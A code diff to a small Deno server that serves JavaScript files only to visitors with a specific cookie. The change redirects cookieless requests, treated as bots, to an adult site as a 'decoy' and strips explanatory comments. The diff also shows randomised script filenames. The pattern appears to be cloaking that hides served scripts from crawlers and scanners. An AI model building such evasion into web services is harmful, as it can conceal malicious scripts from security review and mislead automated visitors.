@@ -3,11 +3,14 @@ Deno.serve({ port: 8080 }, (request: Request): Response => {
     const url = new URL(request.url);
     const cookies = request.headers.get('cookie') || '';
     
-    // Check if this is a script request (ends with .js)
+
     if (url.pathname.endsWith('.js')) {
-      // No cookie = bot, return empty response
+      // No cookie = bot, redirect to decoy
       if (!cookies.includes('_v=1')) {
-        return new Response('', { status: 204 });
+        return new Response(null, {
+          status: 302,
+          headers: { 'Location': 'https://sex.com' }
+        });
       }
 
       const currentPath = url.searchParams.get('p') || '/';
@@ -31,7 +34,7 @@ Deno.serve({ port: 8080 }, (request: Request): Response => {
       });
     }
 
-    // Generate random script filename
+   
     const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
     let randomName = '';
     for (let i = 0; i < 8; i++) {
